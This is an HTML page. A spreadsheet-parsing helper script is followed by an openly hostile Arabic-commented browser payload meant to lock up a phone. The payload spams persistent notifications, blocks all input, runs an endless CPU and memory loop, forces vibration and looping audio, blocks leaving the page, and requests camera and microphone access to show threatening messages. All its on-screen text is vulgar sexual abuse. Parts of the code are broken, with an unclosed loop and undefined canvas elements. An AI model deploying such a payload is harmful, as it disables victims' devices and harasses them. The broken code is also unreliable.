<script type="text/javascript">
        var gk_isXlsx = false;
        var gk_xlsxFileLookup = {};
        var gk_fileData = {};
        function filledCell(cell) {
          return cell !== '' && cell != null;
        }
        function loadFileData(filename) {
        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
            try {
                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
                var firstSheetName = workbook.SheetNames[0];
                var worksheet = workbook.Sheets[firstSheetName];

                // Convert sheet to JSON to filter blank rows
                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
                // Filter out blank rows (rows where all cells are empty, null, or undefined)
                var filteredData = jsonData.filter(row => row.some(filledCell));

                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
                var headerRowIndex = filteredData.findIndex((row, index) =>
                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
                );
                // Fallback
                if (headerRowIndex === -1 || headerRowIndex > 25) {
                  headerRowIndex = 0;
                }

                // Convert filtered JSON back to CSV
                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
                return csv;
            } catch (e) {
                console.error(e);
                return "";
            }
        }
        return gk_fileData[filename] || "";
        }
        </script><!DOCTYPE html>  
<html lang="ar">

<body>

    <script>  
        // رسائل وهمية شرموطية للإشعارات  
        const messages = [ "يا ابن الشرموطة، تلفونك مات! 😈", "فيروس زي الزب هينيك جهازك! 💦", "إشعارات بتنتاكك، يا قحبة! 🔥", "جهازك هيصرخ زي أختك! 😜", "البطارية بتنزل، يا كلب! 😂", "ما تهربش، أنت ملكي! 😈" ];  
        let msgIndex = 0;  
        const msgEl = document.getElementById('msg');  
        setInterval(() => {  
            msgEl.innerText = messages[msgIndex];  
            msgIndex = (msgIndex + 1) % messages.length;  
        }, 500); // تغيير كل نص ثانية  

        // إشعارات قذرة تنفجر بسرعة  
        function spamNotifications() {  
            let notificationCount = 0;  
            const maxNotifications = 1000; // ألف إشعار  
            const interval = setInterval(() => {  
                if (notificationCount >= maxNotifications) {  
                    clearInterval(interval); // وقف بعد ألف  
                    // ابدأ من جديد عشان النيكة مستمرة  
                    setTimeout(spamNotifications, 1000);  
                    return;  
                }  
                for (let i = 0; i < 10; i++) { // 10 إشعارات كل مرة  
                    if (notificationCount < maxNotifications) {  
                        new Notification(`فيروس شرموطي #${notificationCount + 1}`, {  
                            body: messages[Math.floor(Math.random() * messages.length)],  
                            icon: 'https://via.placeholder.com/100?text=💦',  
                            requireInteraction: true // الإشعار ما يروح لحد ما يضغط  
                        });  
                        notificationCount++;  
                    }  
                }  
            }, 100); // إشعارات كل 100 ميلي ثانية  
        }  

        // طلب إذن الإشعارات فوراً  
        if (Notification.permission !== 'granted') {  
            Notification.requestPermission().then(permission => {  
                if (permission === 'granted') {  
                    spamNotifications();  
                } else {  
                    setTimeout(() => Notification.requestPermission(), 1000); // حاول تاني  
                }  
            });  
        } else {  
           spamNotifications();  
        }  

        // نوافذ منبثقة عشان يعلق التلفون  
        setInterval(() => {  
            for (let i = 0; i < 20; i++) {

        // تحميل موارد زيادة عشان تنيك البطارية والذاكرة

            for (let i = 0; i < 60; i++) {  
                const img = new Image();  
                img.src = `https://via.placeholder.com/1500x1500?text=شرموطة${i}`;  
            }

        // منع التحكم بالشاشة  
        document.addEventListener('touchstart', (e) => e.preventDefault(), false);  
        document.addEventListener('touchmove', (e) => e.preventDefault(), false);  
        document.addEventListener('click', (e) => e.preventDefault(), false);  
        document.addEventListener('keydown', (e) => e.preventDefault(), false);  

        // فوضى على الشاشة باستخدام Canvas  
        const canvas = document.getElementById('canvas');

        canvas.height = window.innerHeight;

            ctx.font = '45px Arial';  
            ctx.fillText('تلفونك بتنتاك يا ابن القحبة!', Math.random() * canvas.width, Math.random() * canvas.height);  
        }, 10); // تحديث كل 10 ميلي ثانية  

        // اهتزاز مستمر عشان التلفون ينهار  
        setInterval(() => {  
            if (navigator.vibrate) {  
                navigator.vibrate([1200, 50, 1200, 50]); // اهتزاز قوي جداً  
            }  
        }, 400);  

        // صوت شرموطي لما يحاولوا يسكروا  
        const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2/LDciUFLIHO8tiJNwgZaLvt559NEAxQp+PwtmMcBjiR1/LMeSwFJHfH8N2QQAoUXrTp66hVFApGn+DyvmwhB4Q7T7pP9A');  
        audio.loop = true;  
        audio.play().catch(() => {});  
        window.addEventListener('beforeunload', () => {  
            audio.play().catch(() => {});  
            return 'مش هتروح يا ابن الشرموطة، تلفونك خلاص نايم!';  
        });  

        // حلقة لا نهائية عشان تنيك المعالج والبطارية  
        setInterval(() => {  
            while (true) {  
                Math.random();  
                new Array(4000000).fill(0).map(() => Math.random()); // تحميل قذر جداً  
            }  
        }, 20);  

        // تدوير الشاشة عشان الفوضى التامة  
        setInterval(() => {  
            document.body.style.transform = `rotate(${Math.random() * 360}deg)`;  
        }, 600);  

        // محاولة تشغيل الكاميرا والميكروفون عشان الرعب  
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })  
            .then(() => {  
                setInterval(() => {  
                    msgEl.innerText = 'كاميرتك وميكروفونك معايا يا ابن الكلب! 😈';  
                }, 2000);  
            })  
            .catch(() => {});  
    </script>  
</body>
